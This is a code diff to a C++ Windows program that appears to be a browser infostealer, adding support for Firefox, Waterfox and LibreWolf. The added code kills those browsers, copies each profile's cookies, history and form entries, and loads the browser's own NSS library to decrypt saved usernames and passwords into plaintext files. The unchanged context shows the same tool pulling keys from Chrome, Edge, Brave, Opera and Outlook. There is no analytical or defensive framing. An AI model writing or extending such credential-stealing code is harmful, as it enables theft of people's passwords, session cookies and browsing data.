@@ -17,6 +17,8 @@
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "shell32.lib")
+ #pragma comment(lib, "ole32.lib")
+ #pragma comment(lib, "uuid.lib")
 
 namespace fs = std::filesystem;
 
@@ -31,6 +33,7 @@ struct BrowserConfig {
     bool use_r14;
     bool use_roaming;
     bool has_abe;
+    bool is_firefox;
 };
 
 // Function prototypes
@@ -46,7 +49,7 @@ void set_hardware_breakpoint(uint32_t thread_id, size_t address);
 void clear_hardware_breakpoints(uint32_t process_id);
 void set_resume_flag(uint32_t thread_id);
 bool extract_key(uint32_t thread_id, HANDLE h_process, const BrowserConfig& config, const std::wstring& user_data_dir);
-void extract_outlook_data();
+void extract_firefox_data(const BrowserConfig& config, const std::wstring& user_data_dir);
 
 int main() {
     std::vector<BrowserConfig> configs = {
@@ -58,7 +61,7 @@ int main() {
             {L"Microsoft", L"Olk", L"EBWebView"},
             "outlook_extract",
             "outlook_tmp",
-            false, false, false
+            false, false, false, false
         },
         {
             "Google Chrome",
@@ -68,7 +71,7 @@ int main() {
             {L"Google", L"Chrome", L"User Data"},
             "chrome_extract",
             "chrome_tmp",
-            false, false, true
+            false, false, true, false
         },
         {
             "Microsoft Edge",
@@ -78,7 +81,7 @@ int main() {
             {L"Microsoft", L"Edge", L"User Data"},
             "edge_extract",
             "edge_tmp",
-            true, false, true
+            true, false, true, false
         },
         {
             "Brave",
@@ -88,7 +91,7 @@ int main() {
             {L"BraveSoftware", L"Brave-Browser", L"User Data"},
             "brave_extract",
             "brave_tmp",
-            false, false, true
+            false, false, true, false
         },
         {
             "Opera Stable",
@@ -98,7 +101,7 @@ int main() {
             {L"Opera Software", L"Opera Stable"},
             "opera_extract",
             "opera_tmp",
-            false, true, false
+            false, true, false, false
         },
         {
             "Opera GX",
@@ -108,7 +111,37 @@ int main() {
             {L"Opera Software", L"Opera GX Stable"},
             "operagx_extract",
             "operagx_tmp",
-            false, true, false
+            false, true, false, false
+        },
+        {
+            "Mozilla Firefox",
+            "firefox.exe",
+            {L"C:\\Program Files\\Mozilla Firefox\\firefox.exe", L"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe"},
+            "nss3.dll",
+            {L"Mozilla", L"Firefox", L"Profiles"},
+            "firefox_extract",
+            "firefox_tmp",
+            false, true, false, true
+        },
+        {
+            "Waterfox",
+            "waterfox.exe",
+            {L"C:\\Program Files\\Waterfox\\waterfox.exe", L"C:\\Program Files (x86)\\Waterfox\\waterfox.exe"},
+            "nss3.dll",
+            {L"Waterfox", L"Profiles"},
+            "waterfox_extract",
+            "waterfox_tmp",
+            false, true, false, true
+        },
+        {
+            "LibreWolf",
+            "librewolf.exe",
+            {L"C:\\Program Files\\LibreWolf\\librewolf.exe", L"C:\\Program Files (x86)\\LibreWolf\\librewolf.exe"},
+            "nss3.dll",
+            {L"LibreWolf", L"Profiles"},
+            "librewolf_extract",
+            "librewolf_tmp",
+            false, true, false, true
         }
     };
 
@@ -117,6 +150,9 @@ int main() {
     kill_processes_by_name("brave.exe");
     kill_processes_by_name("opera.exe");
     kill_processes_by_name("launcher.exe");
+    kill_processes_by_name("firefox.exe");
+    kill_processes_by_name("waterfox.exe");
+    kill_processes_by_name("librewolf.exe");
 
     for (const auto& config : configs) {
         std::wstring user_data_dir = get_user_data_dir(config.user_data_subdir, config.use_roaming);
@@ -132,6 +168,11 @@ int main() {
         bool has_key = get_v10_key(user_data_dir, v10_key, is_dpapi);
 
         bool should_debug = config.has_abe;
+
+        if (config.is_firefox) {
+            extract_firefox_data(config, user_data_dir);
+            continue;
+        }
 
         if (has_key) {
             if (is_dpapi && !config.has_abe) {
@@ -831,3 +872,215 @@ std::string to_narrow_string(const wchar_t* w_str) {
     return res;
 }
 // Final check
+
+void extract_firefox_cookies(const fs::path& profile_path, const fs::path& output_dir, const std::string& temp_prefix) {
+    fs::path db_path = profile_path / "cookies.sqlite";
+    if (!fs::exists(db_path)) return;
+
+    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_cookies_" + std::to_string(GetTickCount64()));
+    fs::copy(db_path, temp_db);
+
+    sqlite3* db;
+    if (sqlite3_open(temp_db.string().c_str(), &db) == 0) {
+        sqlite3_stmt* stmt;
+        const char* sql = "SELECT host, name, value, path FROM moz_cookies";
+        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == 0) {
+            std::ofstream ofs(output_dir / "cookies.txt");
+            while (sqlite3_step(stmt) == 100) {
+                const char* host = (const char*)sqlite3_column_text(stmt, 0);
+                const char* name = (const char*)sqlite3_column_text(stmt, 1);
+                const char* value = (const char*)sqlite3_column_text(stmt, 2);
+                const char* path = (const char*)sqlite3_column_text(stmt, 3);
+                ofs << "Host: " << (host ? host : "") << " | Name: " << (name ? name : "") << " | Value: " << (value ? value : "") << " | Path: " << (path ? path : "") << "\n";
+            }
+            sqlite3_finalize(stmt);
+        }
+        sqlite3_close(db);
+    }
+    fs::remove(temp_db);
+}
+
+void extract_firefox_history(const fs::path& profile_path, const fs::path& output_dir, const std::string& temp_prefix) {
+    fs::path db_path = profile_path / "places.sqlite";
+    if (!fs::exists(db_path)) return;
+
+    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_history_" + std::to_string(GetTickCount64()));
+    fs::copy(db_path, temp_db);
+
+    sqlite3* db;
+    if (sqlite3_open(temp_db.string().c_str(), &db) == 0) {
+        sqlite3_stmt* stmt;
+        const char* sql = "SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 100";
+        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == 0) {
+            std::ofstream ofs(output_dir / "history.txt");
+            while (sqlite3_step(stmt) == 100) {
+                const char* url = (const char*)sqlite3_column_text(stmt, 0);
+                const char* title = (const char*)sqlite3_column_text(stmt, 1);
+                int count = sqlite3_column_int(stmt, 2);
+                ofs << "URL: " << (url ? url : "") << " | Title: " << (title ? title : "") << " | Visits: " << count << "\n";
+            }
+            sqlite3_finalize(stmt);
+        }
+        sqlite3_close(db);
+    }
+    fs::remove(temp_db);
+}
+
+void extract_firefox_autofill(const fs::path& profile_path, const fs::path& output_dir, const std::string& temp_prefix) {
+    fs::path db_path = profile_path / "formhistory.sqlite";
+    if (!fs::exists(db_path)) return;
+
+    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_autofill_" + std::to_string(GetTickCount64()));
+    fs::copy(db_path, temp_db);
+
+    sqlite3* db;
+    if (sqlite3_open(temp_db.string().c_str(), &db) == 0) {
+        sqlite3_stmt* stmt;
+        const char* sql = "SELECT fieldname, value FROM moz_formhistory";
+        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == 0) {
+            std::ofstream ofs(output_dir / "autofill.txt");
+            while (sqlite3_step(stmt) == 100) {
+                const char* name = (const char*)sqlite3_column_text(stmt, 0);
+                const char* value = (const char*)sqlite3_column_text(stmt, 1);
+                ofs << "Field: " << (name ? name : "") << " = " << (value ? value : "") << "\n";
+            }
+            sqlite3_finalize(stmt);
+        }
+        sqlite3_close(db);
+    }
+    fs::remove(temp_db);
+}
+
+void extract_firefox_passwords(const fs::path& profile_path, const fs::path& output_dir, const fs::path& nss_dir);
+
+void extract_firefox_data(const BrowserConfig& config, const std::wstring& user_data_dir) {
+    fs::path user_data(user_data_dir);
+    fs::path output_root(config.output_dir);
+    fs::create_directories(output_root);
+
+    fs::path nss_dir;
+    for (const auto& path : config.exe_paths) {
+        if (fs::exists(path)) {
+            nss_dir = fs::path(path).parent_path();
+            break;
+        }
+    }
+
+    for (const auto& entry : fs::directory_iterator(user_data)) {
+        if (entry.is_directory()) {
+            fs::path profile_path = entry.path();
+            if (fs::exists(profile_path / "cookies.sqlite") || fs::exists(profile_path / "logins.json")) {
+                std::string profile_name = profile_path.filename().string();
+                std::cout << "Extracting Firefox data for profile: " << profile_name << std::endl;
+                fs::path profile_output = output_root / profile_name;
+                fs::create_directories(profile_output);
+
+                extract_firefox_cookies(profile_path, profile_output, config.temp_prefix);
+                extract_firefox_history(profile_path, profile_output, config.temp_prefix);
+                extract_firefox_autofill(profile_path, profile_output, config.temp_prefix);
+
+                if (!nss_dir.empty()) {
+                    extract_firefox_passwords(profile_path, profile_output, nss_dir);
+                }
+            }
+        }
+    }
+    std::cout << "Firefox extraction complete for " << config.name << ". Data saved in " << config.output_dir << " folder." << std::endl;
+}
+
+typedef enum {
+    SECSuccess = 0,
+    SECFailure = -1
+} SECStatus;
+
+typedef struct SECItemStr {
+    int type;
+    unsigned char *data;
+    unsigned int len;
+} SECItem;
+
+typedef SECStatus (*PK11_AuthenticatePtr)(void *slot, int load_tokens, void *wincxt);
+typedef void *(*PK11_GetInternalKeySlotPtr)();
+typedef void (*PK11_FreeSlotPtr)(void *slot);
+typedef SECStatus (*NSS_InitPtr)(const char *configdir);
+typedef SECStatus (*NSS_ShutdownPtr)();
+typedef SECStatus (*PK11SDR_DecryptPtr)(SECItem *data, SECItem *result, void *cx);
+
+struct NSS_Functions {
+    HMODULE h_nss;
+    NSS_InitPtr NSS_Init;
+    NSS_ShutdownPtr NSS_Shutdown;
+    PK11_GetInternalKeySlotPtr PK11_GetInternalKeySlot;
+    PK11_FreeSlotPtr PK11_FreeSlot;
+    PK11_AuthenticatePtr PK11_Authenticate;
+    PK11SDR_DecryptPtr PK11SDR_Decrypt;
+};
+
+bool load_nss(const fs::path& nss_path, NSS_Functions& f) {
+    SetDllDirectoryW(nss_path.wstring().c_str());
+    f.h_nss = LoadLibraryW((nss_path / "nss3.dll").wstring().c_str());
+    if (!f.h_nss) return false;
+
+    f.NSS_Init = (NSS_InitPtr)GetProcAddress(f.h_nss, "NSS_Init");
+    f.NSS_Shutdown = (NSS_ShutdownPtr)GetProcAddress(f.h_nss, "NSS_Shutdown");
+    f.PK11_GetInternalKeySlot = (PK11_GetInternalKeySlotPtr)GetProcAddress(f.h_nss, "PK11_GetInternalKeySlot");
+    f.PK11_FreeSlot = (PK11_FreeSlotPtr)GetProcAddress(f.h_nss, "PK11_FreeSlot");
+    f.PK11_Authenticate = (PK11_AuthenticatePtr)GetProcAddress(f.h_nss, "PK11_Authenticate");
+    f.PK11SDR_Decrypt = (PK11SDR_DecryptPtr)GetProcAddress(f.h_nss, "PK11SDR_Decrypt");
+
+    return f.NSS_Init && f.NSS_Shutdown && f.PK11_GetInternalKeySlot && f.PK11_FreeSlot && f.PK11_Authenticate && f.PK11SDR_Decrypt;
+}
+
+void extract_firefox_passwords(const fs::path& profile_path, const fs::path& output_dir, const fs::path& nss_dir) {
+    NSS_Functions nss;
+    if (!load_nss(nss_dir, nss)) return;
+
+    if (nss.NSS_Init(profile_path.string().c_str()) == SECSuccess) {
+        void* slot = nss.PK11_GetInternalKeySlot();
+        if (slot) {
+            if (nss.PK11_Authenticate(slot, TRUE, NULL) == SECSuccess) {
+                fs::path logins_path = profile_path / "logins.json";
+                std::ifstream ifs(logins_path);
+                if (ifs.is_open()) {
+                    std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
+                    std::ofstream ofs(output_dir / "passwords.txt");
+
+                    size_t pos = 0;
+                    while ((pos = content.find("\"hostname\":\"", pos)) != std::string::npos) {
+                        pos += 12;
+                        size_t end = content.find("\"", pos);
+                        std::string host = content.substr(pos, end - pos);
+
+                        pos = content.find("\"encryptedUsername\":\"", pos);
+                        pos += 21;
+                        end = content.find("\"", pos);
+                        std::string enc_user = content.substr(pos, end - pos);
+
+                        pos = content.find("\"encryptedPassword\":\"", pos);
+                        pos += 21;
+                        end = content.find("\"", pos);
+                        std::string enc_pass = content.substr(pos, end - pos);
+
+                        auto user_data = base64_decode(enc_user);
+                        auto pass_data = base64_decode(enc_pass);
+
+                        SECItem user_item = { 0, user_data.data(), (unsigned int)user_data.size() };
+                        SECItem pass_item = { 0, pass_data.data(), (unsigned int)pass_data.size() };
+                        SECItem dec_user = { 0, NULL, 0 };
+                        SECItem dec_pass = { 0, NULL, 0 };
+
+                        if (nss.PK11SDR_Decrypt(&user_item, &dec_user, NULL) == SECSuccess &&
+                            nss.PK11SDR_Decrypt(&pass_item, &dec_pass, NULL) == SECSuccess) {
+                            ofs << "URL: " << host << "\nUser: " << std::string((char*)dec_user.data, dec_user.len)
+                                << "\nPass: " << std::string((char*)dec_pass.data, dec_pass.len) << "\n---\n";
+                        }
+                        pos = end;
+                    }
+                }
+            }
+            nss.PK11_FreeSlot(slot);
+        }
+        nss.NSS_Shutdown();
+    }
+    FreeLibrary(nss.h_nss);
+}
